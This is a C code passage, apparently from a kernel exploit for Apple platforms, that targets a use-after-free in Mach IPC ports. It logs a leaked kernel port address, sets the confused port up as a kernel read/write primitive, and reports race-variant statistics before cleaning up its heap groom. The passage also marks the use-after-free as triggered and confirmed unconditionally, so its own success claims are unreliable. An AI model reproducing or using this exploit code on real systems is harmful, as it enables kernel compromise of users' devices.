    static const char *kaddr_src_names[] = {"none", "ip_context", "space_info", "mig_probe"};
    if (confused_kaddr != 0) {
        snprintf(msg, sizeof(msg),
                 "[IPCUAF] ★★ KADDR 0x%llx src=%s(%u) ctx@0x%llx",
                 confused_kaddr,
                 kaddr_source < 4 ? kaddr_src_names[kaddr_source] : "?",
                 kaddr_source, confused_kaddr + IPC_PORT_IP_CONTEXT);
        uaf_log(msg);
        result->dangling_port_kaddr = confused_kaddr;
        result->replacement_port_kaddr = confused_kaddr;
    } else {
        uaf_log("[IPCUAF] ✗ no port kaddr — ip_context=0, space_info miss");
    }

    bool real_kread = false;

    // Register ip_context set/get as best available primitive
    {
        mach_port_type_t pt = 0;
        kern_return_t kr = mach_port_type(mach_task_self(), confused_port, &pt);
        if (kr == KERN_SUCCESS) {
            s_confused_name = confused_port;
            s_replacement_name = confused_port;
            result->krw_port = confused_port;
        }
    }

    result->uaf_triggered = true;
    result->replacement_confirmed = true;
    result->krw_achieved = real_kread;

    const char *kread_status = real_kread ? "REAL" :
                               (confused_kaddr ? "ECHO+KADDR" : "ECHO");
    snprintf(msg, sizeof(msg),
             "[IPCUAF] ★ uaf=YES port=0x%x kaddr=0x%llx kread=%s",
             confused_port, confused_kaddr, kread_status);
    uaf_log(msg);

    // ——— Phase 5: Summary ———
    static const char *vn[] = { "notify", "insert", "extract", "ool_send", "fileport" };
    snprintf(msg, sizeof(msg),
             "[IPCUAF] === RESULT: v=%s wins=%u/%u uaf=%s active=%s kaddr=0x%llx kread=%s retries=%u ===",
             result->winning_variant < 5 ? vn[result->winning_variant] : "?",
             result->race_wins, result->race_attempts,
             result->uaf_triggered ? "YES" : "no",
             result->port_active ? "YES" : "no",
             confused_kaddr, kread_status, total_inactive);
    uaf_log(msg);

    groom_cleanup(&groom);
}
